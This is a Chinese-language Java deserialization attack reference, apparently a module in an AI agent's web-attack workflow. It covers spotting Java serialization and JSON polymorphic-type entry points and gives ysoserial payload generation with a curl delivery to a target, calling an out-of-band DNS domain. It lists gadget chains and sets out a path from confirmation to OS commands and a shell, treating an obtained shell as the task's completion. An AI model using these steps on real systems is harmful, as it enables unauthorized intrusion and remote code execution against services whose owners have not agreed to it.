# Java JSON / 现代反序列化详细参考

> 明确产品+版本 CVE 的发现/PoC 验证先由 `/web-recon` 处理。本文件负责**无明确 CVE 时**的 Java serialization / JSON polymorphic type / AutoType 类入口手工挖掘和利用思路。

---

## 1. 入口识别

### 原生 Java Serialization

```
Content-Type: application/x-java-serialized-object
base64以 rO0AB 开头
hex: ac ed 00 05
```

破坏几个字节后响应出现：

```
ObjectInputStream
readObject
InvalidClassException
StreamCorruptedException
```

→ 高可信入口。

### JSON 多态类型

关注：

```
@type
@class
$type
type
className
@c
```

错误：

```
Could not resolve type id
AutoType is not support
ClassNotFoundException
InvalidTypeIdException
Jackson polymorphic type
Fastjson
```

---

## 2. Java 原生 Gadget — ysoserial

先用 OOB/低影响 gadget 确认，不要一开始反弹 shell。

```
java -jar ysoserial.jar URLDNS 'http://UNIQUE.interactsh-domain/' > payload.bin
curl -sk https://TARGET/endpoint \
  -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.bin
```

收到 DNS/HTTP OOB → 证明反序列化 gadget 触发。

再根据 classpath 选择：

```
CommonsCollections1-7
CommonsBeanutils1
Groovy1
Spring1/2
Hibernate
C3P0
```

不要盲目轮全部 gadget：优先从错误栈、pom.xml、lockfile、源码确认依赖。

---

## 3. Jackson / Polymorphic Deserialization

信号：

```
@JsonTypeInfo
DefaultTyping
activateDefaultTyping
ObjectMapper
InvalidTypeIdException
```

判断：

```
用户能否控制type id？
目标base type是否Object/interface/abstract？
PolymorphicTypeValidator是否限制？
classpath是否存在可触发gadget？
```

“能指定类名” ≠ “必定 RCE”。

---

## 4. Fastjson 1.x / 2.x 的正确定位

### Fastjson 1.x

历史 AutoType 绕过依赖：

```
版本
AutoType/SafeMode
expectClass
可用类/gadget
JNDI/classloading等运行环境
```

`@type` DNS probe 只能说明某些类型被解析/实例化，不应直接当 RCE。

### CVE-2026-16723

这是**明确产品 CVE**：fastjson 1.2.68–1.2.83 的特定远程资源/类加载路径，Alibaba 官方明确说明 fastjson2 不受这个 CVE 影响。

因此：

```
明确版本候选
→ /web-recon known CVE/PoC validation
```

不要在本文件把它和所有 Fastjson AutoType 混在一起。

### Fastjson2 FNV/hash 研究

2026 前后出现过 type-name hash collision / validation hardening 研究和修复，但：

```
hash collision primitive
≠
任意 Fastjson2 应用通用 RCE
```

必须证明：

```
目标版本
实际 ObjectReader/type resolver sink
filter/allowlist路径
文本等值验证是否存在
classloading/URL行为是否可达
```

**禁止写“fastjson2 <= 某版本 = 一定RCE”这种规则。**

---

## 5. SnakeYAML / XStream / Kryo / Hessian 等

出现库指纹时按库加载单独工具/PoC：

```
SnakeYAML → YAML type tags
XStream   → XML object graph
Kryo      → binary serialization
Hessian   → RPC serialization
```

原则：

```
先证实反序列化入口
→ 证实可控类型/对象图
→ 根据真实依赖选择gadget
→ OOB验证
→ OS command
→ Shell
```

---

## 6. RCE 到 Shell

命令执行确认：

```
id
whoami
```

确认后再根据 OS 选择稳定 shell；不要先执行持久化或后渗透。

Shell 到手 → `/web-attack` COMPLETE。
